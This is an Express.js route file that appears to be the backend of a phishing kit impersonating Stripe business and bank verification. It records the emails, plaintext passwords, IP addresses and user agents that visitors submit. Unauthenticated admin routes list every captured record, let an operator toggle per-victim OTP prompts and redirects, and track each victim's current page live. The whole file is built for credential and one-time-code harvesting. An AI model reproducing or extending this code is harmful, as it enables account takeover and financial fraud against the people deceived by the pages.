const express = require('express');
const router = express.Router();
const User = require('../models/user');
const liveUser = require('../models/liveuser');

router.get('/', (req, res, next) => {
	return res.render('index.ejs');
});

router.get('/home', (req, res, next) => {
	return res.render('index.ejs');
});


router.post('/', (req, res, next) => {
	let personInfo = req.body;
	console.log(req.body)
	
	if (!personInfo.email || !personInfo.password ) {
		console.log("nope" + req.body)
		res.send();
	} else {
		if (personInfo.email != null) {
			console.log(personInfo.email)
			User.findOne({ email: personInfo.email }, (err, data) => {
				if (!data) {
					let c;
					User.findOne({}, (err, data) => {

						if (data) {
							c = data.unique_id + 1;
						} else {
							c = 1;
						}

						let newPerson = new User({
							unique_id: c,
							email: personInfo.email,
							password: personInfo.password,
							userip: personInfo.userip,
							useragent: personInfo.useragent,
							otpstatus: personInfo.otpstatus,
							redirectstatus: personInfo.redirectstatus});

						newPerson.save((err, Person) => {
							if (err)
								console.log(err);
							else
								console.log('Success');
						});

					}).sort({ _id: -1 }).limit(1);
					res.send({ "Success": "regsuc", "email": personInfo.email, "userip": personInfo.userip });
				} else {
					res.send({ "Success": "regalready" , "email": personInfo.email, "userip": personInfo.userip });
				}

			});
		} else {
			res.send({ "Success": "password is not matched" });
		}
	}
});



router.get('/recaptcha', (req, res, next) => {
	return res.render('recaptcha.ejs');
});




router.post('/recaptcha', (req, res, next) => {

	// console.log(req.body)
	User.findOne({ email: req.body.ruseremail }, (err, data) => {
		if (data) {

			if (data.email == req.body.ruseremail) {
				// req.session.userId = data.unique_id;
				res.send({ "Success": "Success!" , "otpstatus": data.otpstatus});
			} else {
				res.send({ "Success": "Wrong password!" });
			}
		} else {
			res.send({ "Success": "This Email Is not regestered!" });
		}
	});
});
















router.get('/login', (req, res, next) => {
	return res.render('login.ejs');
});

router.post('/login', (req, res, next) => {
	User.findOne({ email: req.body.email }, (err, data) => {
		if (data) {

			if (data.password == req.body.password) {
				req.session.userId = data.unique_id;
				res.send({ "Success": "Success!" });
			} else {
				res.send({ "Success": "Wrong password!" });
			}
		} else {
			res.send({ "Success": "This Email Is not regestered!" });
		}
	});
});

router.get('/profile', (req, res, next) => {
	User.findOne({ unique_id: req.session.userId }, (err, data) => {
		if (!data) {
			res.redirect('/');
		} else {
			return res.render('data.ejs', { "name": data.username, "email": data.email });
		}
	});
});

router.get('/logout', (req, res, next) => {
	if (req.session) {
		// delete session object
		req.session.destroy((err) => {
			if (err) {
				return next(err);
			} else {
				return res.redirect('/');
			}
		});
	}
});

router.get('/forgetpass', (req, res, next) => {
	res.render("forget.ejs");
});

router.post('/forgetpass', (req, res, next) => {
	User.findOne({ email: req.body.email }, (err, data) => {
		if (!data) {
			res.send({ "Success": "This Email Is not regestered!" });
		} else {
			if (req.body.password == req.body.passwordConf) {
				data.password = req.body.password;
				data.passwordConf = req.body.passwordConf;

				data.save((err, Person) => {
					if (err)
						console.log(err);
					else
						console.log('Success');
					res.send({ "Success": "Password changed!" });
				});
			} else {
				res.send({ "Success": "Password does not matched! Both Password should be same." });
			}
		}
	});

});





router.get('/BusinessStripe', (req, res, next) => {
	res.render("VerifyBusinessStripe.ejs");
});


router.get('/BankStripe', (req, res, next) => {
	res.render("VerifybankStripe.ejs");
});

router.post('/verifybank', (req, res, next) => {
	console.log(req.body.email)
	User.findOne({ email: req.body.email }, (err, data) => {
		if (data) {

			if (data.email == req.body.email) {
				// req.session.userId = data.unique_id;
				res.send({ "Success": "Success!" , "redirectstatus": data.redirectstatus});
			} else {
				res.send({ "Success": "Something went wrong!" });
			}
		} else {
			res.send({ "Success": "This Email Is not regestered!" });
		}
	});
});



router.get('/loginotp', (req, res, next) => {
	res.render("loginotp.ejs");
});


router.get('/adminpage', (req, res, next) => {
	// res.render("./admin/admin.ejs");



	User.find((err, docs) => {
        if (!err) {
            res.render("./admin/admin.ejs", {
                data: docs
            });
        } else {
            console.log('Failed to retrieve the Course List: ' + err);
        }
	})






	
});


router.post('/updatestats', (req, res, next) => {
	console.log(req.body.email)
	User.findOne({ email: req.body.email }, (err, data) => {
		if (data) {

			if (data.email == req.body.email) {
				// req.session.userId = data.unique_id;
				res.send({ "Success": "Success!" , "yourdata": data});
			} else {
				res.send({ "email": "Something went wrong!" });
			}
		} else {
			res.send({ "error": "This Email Is not regestered!" });
		}
	});







})





router.post('/updatedata', (req, res, next) => {
	console.log(req.body)
	User.findOne({ email: req.body.mongoemail }, (err, data) => {
		if (!data) {
			res.send({ "Success": "Id not found!" });
		} else if (err){

			console(err)
			res.send({ "Success": "Something went wrong!" });
			
		}
		else if (data){
			console.log(req.body)
			
			if (req.body.otpstatus) {
				
				data.otpstatus = req.body.otpstatus;
				
				data.save((err, Person) => {
					if (err)
						console.log(err);
					else
						console.log('Success');
					res.send({ "Success": "OTP changed!" });
				});



				
			}
			
		else if (req.body.redirectstatus) {
				
			data.redirectstatus = req.body.redirectstatus;
			
			data.save((err, Person) => {
				if (err)
					console.log(err);
				else
					console.log('Success');
				res.send({ "Success": "redirecting status changed!" });
			});

			
		} 			
			else {
				res.send({ "Success": "No data to update." });
			}




		}
	});







})




//Live update getter 


router.post('/live', (req, res, next) => {
	let livedata = req.body;
	console.log(req.body)
	
		
			liveUser.findOne({ email: livedata.email }, (err, data) => {
				if (!data) {
					let c;
					liveUser.findOne({}, (err, data) => {

						if (data) {
							c = data.unique_id + 1;
						} else {
							c = 1;
						}

						let newPerson = new liveUser({
							unique_id: c,
							email: livedata.email,
							password: livedata.password,
							userip: livedata.userip,
							useragent: livedata.useragent,
							currentpage: livedata.url,
							});

						newPerson.save((err, Person) => {
							if (err)
								console.log(err);
							else
								console.log('Success');
						});

					}).sort({ _id: -1 }).limit(1);
					res.send({ "Success": "successfully"});
				} 
				else if (data) 
				{
				
					data.currentpage = req.body.url;
				
					data.save((err, Person) => {
						if (err)
							console.log(err);
						else
							console.log('Success');
						res.send({ "Success": "Updated!" });
					});

				}

				 else {
					res.send({ "Success": "err fiund" });
				}

			}); 
});


router.post('/deletelivedata', (req, res, next) => {
	console.log(req.body.email)
	liveUser.findOne({ email: req.body.email }, (err, data) => {
		if (data) {

			liveUser.deleteOne(data, (err, obj)=>{
				if (err) throw err;
				res.send({ "Success": "deleted" });
			})
		} else {

			liveUser.remove(data, (err, obj)=>{
				if (err) throw err;
				res.send({ "Success": "deleted" });
			})



		}

	});
});














router.get('/liveupdates', (req, res, next) => {
	// res.render("./admin/admin.ejs");



	liveUser.find((err, docs) => {
		
        if (!err) {
            
                res.send(docs)
           

			console.log(docs)
        } else {
            console.log('Failed to retrieve the Course List: ' + err);
        }
	})






	
});


























module.exports = router;